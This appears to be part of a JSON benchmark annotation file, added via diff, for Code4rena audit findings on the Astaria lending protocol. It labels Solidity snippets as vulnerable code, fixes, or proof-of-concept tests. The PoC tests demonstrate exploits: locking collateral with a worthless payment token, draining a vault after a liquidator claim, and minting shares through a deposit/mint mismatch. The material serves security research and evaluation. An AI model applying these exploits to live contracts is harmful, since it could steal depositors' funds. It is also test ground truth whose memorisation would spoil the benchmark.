+        "url": "https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626-Cloned.sol#L123-L127",
+        "role": "unknown",
+        "resolution_expectation": "not_fetched",
+        "kind": "github_file",
+        "start_line": 123,
+        "end_line": 127,
+        "repo": "AstariaXYZ/astaria-gpl",
+        "ref": "4b49fe993d9b807fe68b3421ee7f2fe91267c9ef",
+        "path": "src/ERC4626-Cloned.sol",
+        "report_location": {
+          "field": "content",
+          "start_offset": 959,
+          "end_offset": 1079
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 0,
+        "language_label": "solidity",
+        "snippet": "function previewDeposit(\n  uint256 assets\n) public view virtual returns (uint256) {\n  return convertToShares(assets);\n}\n\nfunction convertToShares(\n  uint256 assets\n) public view virtual returns (uint256) {\n  uint256 supply = totalSupply(); // Saves an extra SLOAD if totalSupply is non-zero.\n\n  return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());\n}\n",
+        "snippet_sha256": "65191f1930ca50b8d084770655b492a246a52d67a63e1a8f5f7f5174c41fda17",
+        "role": "context",
+        "role_basis": "`:\n\n[https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626-Cloned.sol#L123-L127](https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626-Cloned.sol#L123-L127)\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 2074,
+          "end_offset": 2443
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 1,
+        "language_label": "solidity",
+        "snippet": "function previewMint(uint256 shares) public view virtual returns (uint256) {\n  uint256 supply = totalSupply(); // Saves an extra SLOAD if totalSupply is non-zero.\n\n  return supply == 0 ? 10e18 : shares.mulDivUp(totalAssets(), supply);\n}\n",
+        "snippet_sha256": "14a449aed7da072df1257a943c12760dddad1addfbb7a38eb1501bd882a31d01",
+        "role": "vulnerable",
+        "role_basis": "``\n\n[https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626-Cloned.sol#L129-L133](https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626-Cloned.sol#L129-L133)\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 2706,
+          "end_offset": 2943
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 2,
+        "language_label": "solidity",
+        "snippet": "contract MockERC20 is ERC20(\"Mock ERC20\", \"MERC20\", 18) {\n    function mint(address account, uint256 amount) external {\n        _mint(account, amount);\n    }\n}\n\ncontract TestERC4626 is ERC4626Cloned {\n    ERC20 _asset;\n\n    constructor() {\n        _asset = new MockERC20();\n    }\n\n    function asset() public override view returns (address assetTokenAddress) {\n        return address(_asset);\n    }\n\n    function minDepositAmount() public override view returns (uint256) {\n        return 0;\n    }\n\n    function totalAssets() public override view returns (uint256) {\n        return _asset.balanceOf(address(this));\n    }\n\n    function symbol() external override view returns (string memory) {\n        return \"TEST4626\";\n    }\n    function name() external override view returns (string memory) {\n        return \"TestERC4626\";\n    }\n\n    function decimals() external override view returns (uint8) {\n        return 18;\n    }\n}\n\ncontract AuditTest is Test {\n    function test_ERC4626Cloned_DepositMintDiscrepancy() public {\n        TestERC4626 vault = new TestERC4626();\n        MockERC20 token = MockERC20(vault.asset());\n\n        // Amount we deposit\n        uint256 amount = 25e18;\n        // Shares we get if we deposit amount\n        uint256 shares = vault.previewDeposit(amount);\n        // Amount needed to mint shares\n        uint256 amountNeeded = vault.previewMint(shares);\n\n        // The following values should be equal but they not\n        assertFalse(amount == amountNeeded);\n\n        // An attacker can still mint a single share by using deposit to manipulate the pool\n        token.mint(address(this), 1);\n        token.approve(address(vault), type(uint256).max);\n        uint256 mintedShares = vault.deposit(1, address(this));\n\n        assertEq(mintedShares, 1);\n    }\n}\n",
+        "snippet_sha256": "a6433e63965e6eab0af5776e3d8370d57d3f353e54b4e666aedc722bf26405db",
+        "role": "poc",
+        "role_basis": "positor.\n\nHowever, the protocol has failed to replicate this logic in the `deposit` function, as both `deposit` and `mint` logic differ (see PoC).\n\nAn attacker can still use the `deposit` function to mint any number of shares.\n\n### Proof of Concept\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 3625,
+          "end_offset": 5409
+        }
+      }
+    ],
+    "forbidden": [
+      {
+        "type": "url",
+        "url": "https://github.com/code-423n4/2023-01-astaria-findings/issues/588",
+        "reason": "Report/issue reference; not a code-file candidate. It may feed a report resolver."
+      }
+    ]
+  },
+  {
+    "case_id": "c4-2023-01-astaria-h-03-improper-validations-in-clearinghouse-possible-to-lock-collateral-nft-in-contract",
+    "input_sha256": "afe7fca6e4130c7dbec8df004900bc8a58b48042671e85938c2b54f664b21e7c",
+    "annotation_scope": "selected_targets",
+    "reviewer": "assistant-report-review",
+    "status": "report_reviewed",
+    "review_note": "Selected candidates and roles reviewed against report text; remote code not independently verified.",
+    "expected": [
+      {
+        "type": "url",
+        "url": "https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L169-L178",
+        "role": "unknown",
+        "resolution_expectation": "not_fetched",
+        "kind": "github_file",
+        "start_line": 169,
+        "end_line": 178,
+        "repo": "code-423n4/2023-01-astaria",
+        "ref": "1bfc58b42109b839528ab1c21dc9803d663df898",
+        "path": "src/ClearingHouse.sol",
+        "report_location": {
+          "field": "content",
+          "start_offset": 1753,
+          "end_offset": 1876
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_diff",
+        "block_index": 0,
+        "language_label": "diff",
+        "snippet": "diff --git a/src/test/AstariaTest.t.sol b/src/test/AstariaTest.t.sol\nindex c7ce162..bfaeca6 100644\n--- a/src/test/AstariaTest.t.sol\n+++ b/src/test/AstariaTest.t.sol\n@@ -18,6 +18,7 @@ import \"forge-std/Test.sol\";\n import {Authority} from \"solmate/auth/Auth.sol\";\n import {FixedPointMathLib} from \"solmate/utils/FixedPointMathLib.sol\";\n import {MockERC721} from \"solmate/test/utils/mocks/MockERC721.sol\";\n+import {MockERC20} from \"solmate/test/utils/mocks/MockERC20.sol\";\n import {\n   MultiRolesAuthority\n } from \"solmate/auth/authorities/MultiRolesAuthority.sol\";\n@@ -1030,8 +1031,19 @@ contract AstariaTest is TestHelpers {\n       uint8(0)\n     );\n     vm.stopPrank();\n-    uint256 bid = 100 ether;\n-    _bid(Bidder(bidder, bidderPK), listedOrder, bid);\n+\n+    uint256 collateralId = tokenContract.computeId(tokenId);\n+    ClearingHouse CH = COLLATERAL_TOKEN.getClearingHouse(collateralId);\n+\n+    // create a worthless token and send it to the clearinghouse\n+    MockERC20 worthlessToken = new MockERC20(\"TestToken\",\"TST\",18);\n+    worthlessToken.mint(address(CH),550 ether);\n+\n+    // call safeTransferFrom on clearinghouse with the worthless token as paymentToken\n+    // thiss will trigger the cleaning up after succesful auction\n+    uint256 tokenAsInt = uint256(uint160(address(worthlessToken)));\n+    bytes memory emptyBytes;\n+    CH.safeTransferFrom(address(0),address(bidder),tokenAsInt,0,emptyBytes);\n\n     // assert the bidder received the NFT\n     assertEq(nft.ownerOf(tokenId), bidder, \"Bidder did not receive NFT\");\n",
+        "snippet_sha256": "3a7e47d03c81894be4388f1b09382be3f60cd35420eab1660115f5cfd4a678cf",
+        "role": "poc",
+        "role_basis": "collateralIdToAuction` was cleared.\n\nTrying to create a new Lien also fails as that calls `CollateralToken.ownerOf(collateralID)`.\n\n### Proof of concept\n\nTo test the scenario, I have modified the testLiquidationNftTransfer test in AstariaTest.t.sol\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 5974,
+          "end_offset": 7504
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_diff",
+        "block_index": 1,
+        "language_label": "diff",
+        "snippet": "diff --git a/src/interfaces/ILienToken.sol b/src/interfaces/ILienToken.sol\nindex 964caa2..06433c0 100644\n--- a/src/interfaces/ILienToken.sol\n+++ b/src/interfaces/ILienToken.sol\n@@ -238,6 +238,7 @@ interface ILienToken is IERC721 {\n     uint48 startTime;\n     uint48 endTime;\n     address liquidator;\n+    address settlementToken;\n     AuctionStack[] stack;\n   }\n",
+        "snippet_sha256": "df58b3f0ea80db217d01d03764615d9cb483ac29df6cfac89680e82633365bb5",
+        "role": "fix",
+        "role_basis": "strict calls to the function to whitelisted addresses (OpenSea controler and conduit ).\n\nIn the current setup, there is no easy way for the ClearingHouse to access information about the settlementToken.\n\nIt could be added to the AuctionData struct:\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 8340,
+          "end_offset": 8702
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_diff",
+        "block_index": 2,
+        "language_label": "diff",
+        "snippet": "diff --git a/src/LienToken.sol b/src/LienToken.sol\nindex 631ac02..372e197 100644\n--- a/src/LienToken.sol\n+++ b/src/LienToken.sol\n@@ -340,6 +340,8 @@ contract LienToken is ERC721, ILienToken, AuthInitializable {\n       .liquidationInitialAsk\n       .safeCastTo88();\n     auctionData.endAmount = uint88(1000 wei);\n+    auctionData.settlementToken = stack[0].lien.token; \n+\n     s.COLLATERAL_TOKEN.getClearingHouse(collateralId).setAuctionData(\n       auctionData\n     );\n",
+        "snippet_sha256": "08d639ad2e38dd160f539c87ab55be7464b95c4ffb1fe7031519a189f40fc3cf",
+        "role": "fix",
+        "role_basis": "src/interfaces/ILienToken.sol\n@@ -238,6 +238,7 @@ interface ILienToken is IERC721 {\n     uint48 startTime;\n     uint48 endTime;\n     address liquidator;\n+    address settlementToken;\n     AuctionStack[] stack;\n   }\n```\n\nand then add it in LienToken\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 8745,
+          "end_offset": 9214
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_diff",
+        "block_index": 3,
+        "language_label": "diff",
+        "snippet": "diff --git a/src/ClearingHouse.sol b/src/ClearingHouse.sol\nindex 5c2a400..d305ff5 100644\n--- a/src/ClearingHouse.sol\n+++ b/src/ClearingHouse.sol\n@@ -120,7 +120,7 @@ contract ClearingHouse is AmountDeriver, Clone, IERC1155, IERC721Receiver {\n     IAstariaRouter ASTARIA_ROUTER = IAstariaRouter(_getArgAddress(0)); // get the router from the immutable arg\n\n     ClearingHouseStorage storage s = _getStorage();\n-    address paymentToken = bytes32(encodedMetaData).fromLast20Bytes();\n+    address paymentToken = s.auctionStack.settlementToken;\n\n     uint256 currentOfferPrice = _locateCurrentAmount({\n       startAmount: s.auctionStack.startAmount,\n",
+        "snippet_sha256": "74fef7c70ba7aa3e46103756233e4c9270b26583aab8fedfda1c799ef2f9ff5d",
+        "role": "fix",
+        "role_basis": "0 wei);\n+    auctionData.settlementToken = stack[0].lien.token; \n+\n     s.COLLATERAL_TOKEN.getClearingHouse(collateralId).setAuctionData(\n       auctionData\n     );\n```\n\nIn the ClearingHouse it can be used directly, ignoring the supplied parameter:\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 9307,
+          "end_offset": 9952
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_diff",
+        "block_index": 4,
+        "language_label": "diff",
+        "snippet": "diff --git a/src/ClearingHouse.sol b/src/ClearingHouse.sol\nindex 5c2a400..5a79184 100644\n--- a/src/ClearingHouse.sol\n+++ b/src/ClearingHouse.sol\n@@ -121,6 +121,7 @@ contract ClearingHouse is AmountDeriver, Clone, IERC1155, IERC721Receiver {\n\n     ClearingHouseStorage storage s = _getStorage();\n     address paymentToken = bytes32(encodedMetaData).fromLast20Bytes();\n+    require(paymentToken == s.auctionStack.settlementToken);\n\n     uint256 currentOfferPrice = _locateCurrentAmount({\n       startAmount: s.auctionStack.startAmount,\n",
+        "snippet_sha256": "6fc40777929b28bc6d441012852864bab966f672c88978161e769fea5ca10620",
+        "role": "fix",
+        "role_basis": "(encodedMetaData).fromLast20Bytes();\n+    address paymentToken = s.auctionStack.settlementToken;\n\n     uint256 currentOfferPrice = _locateCurrentAmount({\n       startAmount: s.auctionStack.startAmount,\n```\n\nor used to check the supplied paramameter\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 10008,
+          "end_offset": 10542
+        }
+      }
+    ],
+    "forbidden": [
+      {
+        "type": "url",
+        "url": "https://github.com/code-423n4/2023-01-astaria-findings/issues/521",
+        "reason": "Report/issue reference; not a code-file candidate. It may feed a report resolver."
+      }
+    ]
+  },
+  {
+    "case_id": "c4-2023-01-astaria-h-04-strategist-can-fail-to-withdraw-asset-token-from-a-private-vault",
+    "input_sha256": "34e0a44d090e8af9726aa398d1a2155063ca479bc7ec47fd54028d40ef978679",
+    "annotation_scope": "selected_targets",
+    "reviewer": "assistant-report-review",
+    "status": "report_reviewed",
+    "review_note": "Selected candidates and roles reviewed against report text; remote code not independently verified.",
+    "expected": [
+      {
+        "type": "url",
+        "url": "https://github.com/AstariaXYZ/astaria-gpl/blob/main/src/ERC4626RouterBase.sol#L41-L52",
+        "role": "unknown",
+        "resolution_expectation": "not_fetched",
+        "kind": "github_file",
+        "start_line": 41,
+        "end_line": 52,
+        "repo": "AstariaXYZ/astaria-gpl",
+        "ref": "main",
+        "path": "src/ERC4626RouterBase.sol",
+        "report_location": {
+          "field": "content",
+          "start_offset": 580,
+          "end_offset": 665
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 0,
+        "language_label": "solidity",
+        "snippet": "  function withdraw(\n    IERC4626 vault,\n    address to,\n    uint256 amount,\n    uint256 maxSharesOut\n  ) public payable virtual override returns (uint256 sharesOut) {\n\n    ERC20(address(vault)).safeApprove(address(vault), amount);\n    if ((sharesOut = vault.withdraw(amount, to, msg.sender)) > maxSharesOut) {\n      revert MaxSharesError();\n    }\n  }\n",
+        "snippet_sha256": "87f08f3159696d1dcf8e79c8a6e1777b2c36a64adb958be3b2e048c3d42ba142",
+        "role": "context",
+        "role_basis": "withdraw this asset token from this private vault and lose this deposit.\n\n[https://github.com/AstariaXYZ/astaria-gpl/blob/main/src/ERC4626RouterBase.sol#L41-L52](https://github.com/AstariaXYZ/astaria-gpl/blob/main/src/ERC4626RouterBase.sol#L41-L52)\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 1847,
+          "end_offset": 2199
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 1,
+        "language_label": "solidity",
+        "snippet": "  function withdraw(uint256 amount) external {\n    require(msg.sender == owner());\n    ERC20(asset()).safeTransferFrom(address(this), msg.sender, amount);\n  }\n",
+        "snippet_sha256": "fbffaef4ae337b1e4911557c23132234e81bb23f37c719ac6e9cc989ba6de9e4",
+        "role": "vulnerable",
+        "role_basis": "(amount, to, msg.sender)) > maxSharesOut) {\n      revert MaxSharesError();\n    }\n  }\n```\n\n[https://github.com/code-423n4/2023-01-astaria/blob/main/src/Vault.sol#L70-L73](https://github.com/code-423n4/2023-01-astaria/blob/main/src/Vault.sol#L70-L73)\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 2376,
+          "end_offset": 2535
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 2,
+        "language_label": "solidity",
+        "snippet": "  function testPrivateVaultStrategistIsUnableToWithdraw() public {\n    uint256 amountToLend = 50 ether;\n    vm.deal(strategistOne, amountToLend);\n\n    address privateVault = _createPrivateVault({\n      strategist: strategistOne,\n      delegate: strategistTwo\n    });\n\n    vm.startPrank(strategistOne);\n\n    WETH9.deposit{value: amountToLend}();\n    WETH9.approve(privateVault, amountToLend);\n\n    // strategistOne deposits 50 ether WETH to privateVault\n    Vault(privateVault).deposit(amountToLend, strategistOne);\n\n    // calling router's withdraw function for withdrawing assets from privateVault reverts\n    vm.expectRevert(bytes(\"APPROVE_FAILED\"));\n    ASTARIA_ROUTER.withdraw(\n      IERC4626(privateVault),\n      strategistOne,\n      amountToLend,\n      type(uint256).max\n    );\n\n    // directly withdrawing various asset amounts from privateVault also fails\n    vm.expectRevert(bytes(\"TRANSFER_FROM_FAILED\"));\n    Vault(privateVault).withdraw(amountToLend);\n\n    vm.expectRevert(bytes(\"TRANSFER_FROM_FAILED\"));\n    Vault(privateVault).withdraw(1);\n\n    vm.stopPrank();\n  }\n",
+        "snippet_sha256": "04a8925e70e1ad72f3ca9509188a1dc350a9f552613784715606f24d5d97d775",
+        "role": "poc",
+        "role_basis": "msg.sender == owner());\n    ERC20(asset()).safeTransferFrom(address(this), msg.sender, amount);\n  }\n```\n\n### Proof of Concept\n\nPlease add the following test in `src\\test\\AstariaTest.t.sol`. This test will pass to demonstrate the described scenario.\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 2697,
+          "end_offset": 3776
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 3,
+        "language_label": "solidity",
+        "snippet": "    ERC20(asset()).safeTransfer(msg.sender, amount);\n",
+        "snippet_sha256": "0c1aa2a1b0e125d5de8af3fe473cf2b538143af0e84c291edc6b7226fdb2a99e",
+        "role": "fix",
+        "role_basis": "\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\n[https://github.com/code-423n4/2023-01-astaria/blob/main/src/Vault.sol#L72](https://github.com/code-423n4/2023-01-astaria/blob/main/src/Vault.sol#L72) can be updated to the following code.\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 4041,
+          "end_offset": 4094
+        }
+      }
+    ],
+    "forbidden": [
+      {
+        "type": "url",
+        "url": "https://github.com/code-423n4/2023-01-astaria-findings/issues/489",
+        "reason": "Report/issue reference; not a code-file candidate. It may feed a report resolver."
+      }
+    ]
+  },
+  {
+    "case_id": "c4-2023-01-astaria-h-05-vault-may-be-drained-after-a-liquidated-nft-was-claimed-by-the-liquidator",
+    "input_sha256": "56e97381f7fbf2a045674022c965657e23d16f32a8f388479101aa8f67c9593f",
+    "annotation_scope": "selected_targets",
+    "reviewer": "assistant-report-review",
+    "status": "report_reviewed",
+    "review_note": "Selected candidates and roles reviewed against report text; remote code not independently verified.",
+    "expected": [
+      {
+        "type": "url",
+        "url": "https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L220-L231",
+        "role": "unknown",
+        "resolution_expectation": "not_fetched",
+        "kind": "github_file",
+        "start_line": 220,
+        "end_line": 231,
+        "repo": "code-423n4/2023-01-astaria",
+        "ref": "1bfc58b42109b839528ab1c21dc9803d663df898",
+        "path": "src/ClearingHouse.sol",
+        "report_location": {
+          "field": "content",
+          "start_offset": 260,
+          "end_offset": 383
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 0,
+        "language_label": "solidity",
+        "snippet": "// src/test/AstariaTest.t.sol\nfunction testAuctionEndNoBidsMismanagement_AUDIT() public {\n  address bob = address(2);\n  TestNFT nft = new TestNFT(6);\n  uint256 tokenId = uint256(5);\n  address tokenContract = address(nft);\n\n  // Creating a public vault and providing some liquidity.\n  address publicVault = _createPublicVault({\n    strategist: strategistOne,\n    delegate: strategistTwo,\n    epochLength: 14 days\n  });\n\n  _lendToVault(Lender({addr: bob, amountToLend: 150 ether}), publicVault);\n  (, ILienToken.Stack[] memory stack) = _commitToLien({\n    vault: publicVault,\n    strategist: strategistOne,\n    strategistPK: strategistOnePK,\n    tokenContract: tokenContract,\n    tokenId: tokenId,\n    lienDetails: blueChipDetails,\n    amount: 100 ether,\n    isFirstLien: true\n  });\n\n  uint256 collateralId = tokenContract.computeId(tokenId);\n  vm.warp(block.timestamp + 11 days);\n\n  // Liquidator liquidates the loan after expiration.\n  address liquidator = address(0x123);\n  vm.prank(liquidator);\n  OrderParameters memory listedOrder = ASTARIA_ROUTER.liquidate(\n    stack,\n    uint8(0)\n  );\n\n  // Skipping the auction duration and making no bids.\n  skip(4 days);\n\n  // Liquidator claims the liquidated NFT.\n  vm.prank(liquidator);\n  COLLATERAL_TOKEN.liquidatorNFTClaim(listedOrder);\n  PublicVault(publicVault).processEpoch();\n\n  // Liquidator is the rightful owner of the collateral NFT.\n  assertEq(nft.ownerOf(tokenId), address(liquidator));\n\n  // Since the auction wasn't fully settled, the CollateralToken still exists for the collateral NFT.\n  // The borrower is the owner of the CollateralToken.\n  assertEq(COLLATERAL_TOKEN.ownerOf(collateralId), address(this));\n\n  // WETH balances at this moment:\n  // 1. the borrower keep holding the 100 ETH it borrowed earlier;\n  // 2. the vault keeps holding 50 ETH of liquidity.\n  assertEq(WETH9.balanceOf(address(this)), 100 ether);\n  assertEq(WETH9.balanceOf(address(publicVault)), 50 ether);\n\n  // The borrower creates another lien. This time, the borrower is not the owner of the collateral NFT.\n  // However, it's still the owner of the CollateralToken.\n  (, stack) = _commitToLien({\n    vault: publicVault,\n    strategist: strategistOne,\n    strategistPK: strategistOnePK,\n    tokenContract: tokenContract,\n    tokenId: tokenId,\n    lienDetails: blueChipDetails,\n    amount: 50 ether,\n    isFirstLien: true\n  });\n\n  // The borrower has taken a loan of 50 ETH from the vault.\n  assertEq(WETH9.balanceOf(address(this)), 150 ether);\n  // The vault was drained.\n  assertEq(WETH9.balanceOf(address(publicVault)), 0 ether);\n}\n",
+        "snippet_sha256": "0594f0077f5198af2245185b4a911cee8e879d0e0b79e60d2d4ab5a69bea4ea0",
+        "role": "poc",
+        "role_basis": "\n\n- The collateral NFT wasn’t sold off auction as there were no bids.\n\n- Bob claims the collateral NFT and receives it.\n\n- Alice takes another loan from the vault without providing any collateral.\n\nThe following PoC demonstrates the above scenario:\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 2820,
+          "end_offset": 5391
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_diff",
+        "block_index": 1,
+        "language_label": "diff",
+        "snippet": "diff --git a/src/ClearingHouse.sol b/src/ClearingHouse.sol\nindex 5c2a400..d4ee28d 100644\n--- a/src/ClearingHouse.sol\n+++ b/src/ClearingHouse.sol\n@@ -228,5 +228,7 @@ contract ClearingHouse is AmountDeriver, Clone, IERC1155, IERC721Receiver {\n       0,\n       s.auctionStack.stack\n     );\n+    uint256 collateralId = _getArgUint256(21);\n+    ASTARIA_ROUTER.COLLATERAL_TOKEN().settleAuction(collateralId);\n   }\n }\n",
+        "snippet_sha256": "3ff3cc5668815c9d1c1dab6b930b84c34f0a1d7cd627ae146566c5a09a94f2d3",
+        "role": "fix",
+        "role_basis": "tEq(WETH9.balanceOf(address(this)), 150 ether);\n  // The vault was drained.\n  assertEq(WETH9.balanceOf(address(publicVault)), 0 ether);\n}\n```\n\n### Recommended Mitigation Steps\n\nConsider settling the auction at the end of `settleLiquidatorNFTClaim`:\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 5511,
+          "end_offset": 5922
+        }
+      }
+    ],
+    "forbidden": [
+      {
+        "type": "url",
+        "url": "https://github.com/code-423n4/2023-01-astaria-findings/issues/480",
+        "reason": "Report/issue reference; not a code-file candidate. It may feed a report resolver."
+      }
+    ]
+  }
+]
